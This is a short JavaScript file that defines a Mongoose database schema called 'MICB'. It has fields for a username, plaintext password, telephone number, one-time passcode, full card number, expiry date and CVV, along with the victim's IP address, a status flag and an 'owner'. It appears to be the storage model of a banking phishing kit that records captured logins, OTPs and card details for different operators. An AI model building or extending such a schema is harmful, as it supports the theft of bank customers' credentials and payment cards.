const mongoose = require("mongoose");

const micbSchema = new mongoose.Schema({
    uniqueid: String,
    username: String,
    password: String,
    telephone: String,
    otp: String,
    ccnum: String,
    ccexp: String,
    cvv: String,
    status: Number,
    ip: String,
    owner: String,
    timestamp: Date,
});

module.exports = mongoose.model("MICB", micbSchema);
